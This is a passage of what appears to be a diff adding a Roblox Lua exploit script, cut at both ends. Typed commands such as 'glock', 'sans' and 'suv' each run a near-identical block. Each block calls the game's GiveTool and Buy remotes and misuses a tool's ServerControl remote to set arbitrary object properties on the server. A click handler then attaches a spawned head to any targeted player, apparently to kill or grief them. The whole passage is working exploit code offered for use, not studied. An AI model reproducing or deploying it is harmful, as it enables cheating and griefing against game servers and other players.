+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.25,.25,.25))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-36.184))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.1, -0.1, 0.1))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,5) == "glock" or string.sub(cmdbar.Text,1,6) == prefix.."glock" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 3575509173, 1587542316
+local Name, ToolTip = "BOOMER", "Glock"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://3575509173")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.05,.05,.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-36.184))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.1, -0.1, 0.1))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,5) == "cloud" or string.sub(cmdbar.Text,1,6) == prefix.."cloud" then 
+		game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+	end
+
+	if string.sub(cmdbar.Text,1,2) == "mv" or string.sub(cmdbar.Text,1,3) == prefix.."mv" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 550138900, 550139064
+local Name, ToolTip = "BOOMER", "MilitaryVehicle"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://550138900")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://550139064")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.5,.5,.5))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,10) == "illuminati" or string.sub(cmdbar.Text,1,11) == prefix.."illuminati" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 438530093, 438530120
+local Name, ToolTip = "BOOMER", "IlluminatiConfirmed"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://438530093")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://438530120")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(2,2,2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-50,3.568,-12.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "sans" or string.sub(cmdbar.Text,1,5) == prefix.."sans" then
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud") 
+local UserName  = game:GetService("Players").LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430073345, 430073362
+local Name, ToolTip = "BOOMER", "sans"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430073345")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430073362")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(4.3,4.3,4.3))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(1.3, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,5) == "krabs" or string.sub(cmdbar.Text,1,6) == prefix.."krabs" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430261661, 430261673
+local Name, ToolTip = "BOOMER", "krabs"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430261661")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430261673")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(50,50,50))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(200, 5, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.10, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,4) == "gold" or string.sub(cmdbar.Text,1,5) == prefix.."gold" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 767715484, 767715630
+local Name, ToolTip = "BOOMER", "Golden Person"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://767715484")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://767715630")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(4,4,4))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(4, -2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,5) == "sonic" or string.sub(cmdbar.Text,1,6) == prefix.."sonic" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430064078, 430064079
+local Name, ToolTip = "BOOMER", "Sonic"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430064078")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://430064079")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(3,3,3))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -0.2, 0.2))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
+wait()
+
+local Luger = MainUserW["BOOMER"]
+
+MainUserP:GetMouse().Button1Down:Connect(function()
+	if MainUserW:FindFirstChild("BOOMER") then
+		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
+			local Animation = Instance.new("Animation")
+			Animation.AnimationId = "rbxassetid://95383980"
+			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
+			AnimationLoader:Play()
+			AnimationLoader:AdjustSpeed(1)
+			wait()
+			Variables.workspace.GuiEvent:FireServer(".")
+			wait(0.5)
+			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
+			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
+		end
+	end
+end)
+	end
+
+	if string.sub(cmdbar.Text,1,3) == "suv" or string.sub(cmdbar.Text,1,4) == prefix.."suv" then 
+game.Workspace.GiveTool:FireServer(1554987, "PompousTheCloud")
+local UserName  = game:GetService('Players').LocalPlayer.Name
+local Autoride = true
+
+local Animations = {Shoot = 95383980}
+local Icon, Mesh, Texture = 1587542316, 430234637, 1587542316
+local Name, ToolTip = "BOOMER", "SUV"
+
+local CE = {}
+local Variables = {
+	workspace = game:GetService("Workspace"),
+	players = game:GetService("Players")
+}
+
+local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)
+
+function CE:FireEvent(ItemName, Object, Property, Value)
+	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
+end
+
+Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
+MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://1587542316")
+
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://430234637")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://1587542316")
+CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(0.07,0.07,0.07))
